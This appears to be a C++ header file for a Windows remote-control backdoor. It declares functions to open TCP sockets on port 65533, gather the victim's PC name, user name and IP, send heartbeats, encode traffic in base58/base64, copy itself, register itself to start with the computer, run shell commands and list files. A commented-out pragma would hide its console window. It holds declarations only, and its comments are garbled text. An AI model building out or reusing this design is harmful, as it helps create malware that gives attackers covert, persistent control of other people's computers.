#pragma once
#ifndef _TCPSOCKET_H_
#define _TCPSOCKET_H_
#define _CRT_SECURE_NO_WARNINGS 1
#define _WINSOCK_DEPRECATED_NO_WARNINGS 1
#include <io.h>
#include <stdlib.h>
#include <vector>
#include <fstream>  //ifstream
#include <string>   //����getline()
#include <cmath>
#include <iostream>
#include <cstdlib>
#include <stdio.h>
#include <tchar.h>
#include <thread>
#include <atlimage.h>
#include   "windows.h "                      
#include   "shellapi.h " 
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

//����ʾ����̨��ɫ����
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define PORT 65533
//#define err(errMsg) printf("[line: %d]%s failed code %d\n", __LINE__, errMsg, WSAGetLastError())
#define FileNameRow MAX_PATH		//�����ȡ�ļ����Ķ�ά�����С
#define FileNameCol MAX_PATH

using namespace std;

struct PC_Message
{
	char PCName[BUFSIZ];
	TCHAR UserName[BUFSIZ];
	char IP[BUFSIZ];
};
//�������
bool init_Socket();
//�ر������
bool close_Socket();
//���������socket
SOCKET CreatServerScoket();
//�����ͻ���socket
SOCKET CreatClientScoket(const char* ip);
//��ȡĿ��������IP����������Լ��û���
bool getmessage(struct PC_Message* messages);
//��TCHAR������ת��Ϊchar
bool TcharToChar(const TCHAR* tchar, char* _char);
//��������
bool HeartBeat(SOCKET fd);
//base58���뺯��
void base58encode(char plainText[]);
//base58���뺯��
bool base58decode(unsigned char* src);
//base64���뺯��
void base64encode(char* str);
//base64���뺯��
void base64decode(char* str);
//���ܺ���
void encode(char* text);
//���ܺ���
void decode(char* pwd);
//����������
int ComputerStart(char* pathName);
//charת��Ϊlpwstr
LPWSTR CharToLPWSTR(const char* szString);
//���Ҹ���
int copySelf(char* path);
//ִ��shellָ��
int cmd(char* cmdStr, char* message);
//��ȡ�ļ���
void GetFileName(char FileName[FileNameRow][FileNameCol], char* str);

#endif // !_TCPSOCKET_H